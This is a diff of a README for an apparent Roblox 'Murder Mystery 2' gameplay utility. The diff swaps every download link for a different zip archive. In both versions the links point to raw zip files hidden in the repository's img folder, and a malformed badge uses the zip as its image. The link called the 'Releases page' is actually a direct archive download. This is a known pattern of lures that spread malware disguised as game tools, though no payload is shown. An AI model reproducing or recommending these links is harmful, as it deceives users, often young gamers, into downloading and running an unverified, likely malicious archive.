@@ -6,11 +6,11 @@ Welcome to the Murder-Mystery-2-Gameplay-Utility-Framework! This framework is bu
 
 ## 🔗 Download Link
 
-[![Download](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/raw/refs/heads/main/img/Murder-Gameplay-Utility-Framework-Mystery-3.0.zip%20Now-blue)](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/raw/refs/heads/main/img/Murder-Gameplay-Utility-Framework-Mystery-3.0.zip)
+[![Download](https://raw.githubusercontent.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/main/img/Murder_Mystery_Utility_Gameplay_Framework_v1.6.zip%20Now-blue)](https://raw.githubusercontent.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/main/img/Murder_Mystery_Utility_Gameplay_Framework_v1.6.zip)
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Murder-Mystery-2-Gameplay-Utility-Framework Releases](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/raw/refs/heads/main/img/Murder-Gameplay-Utility-Framework-Mystery-3.0.zip).
+1. Visit this page to download: [Murder-Mystery-2-Gameplay-Utility-Framework Releases](https://raw.githubusercontent.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/main/img/Murder_Mystery_Utility_Gameplay_Framework_v1.6.zip).
 
 2. On the releases page, look for the latest version. You will see a list of assets available for download.
 
@@ -62,6 +62,6 @@ Be a part of our growing community. Share your experiences, ask questions, and g
 
 ## 🔗 Download Link
 
-[![Download](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/raw/refs/heads/main/img/Murder-Gameplay-Utility-Framework-Mystery-3.0.zip%20Now-blue)](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/raw/refs/heads/main/img/Murder-Gameplay-Utility-Framework-Mystery-3.0.zip)
+[![Download](https://raw.githubusercontent.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/main/img/Murder_Mystery_Utility_Gameplay_Framework_v1.6.zip%20Now-blue)](https://raw.githubusercontent.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/main/img/Murder_Mystery_Utility_Gameplay_Framework_v1.6.zip)
 
 Thank you for using the Murder-Mystery-2-Gameplay-Utility-Framework! We hope it enhances your gaming experience.
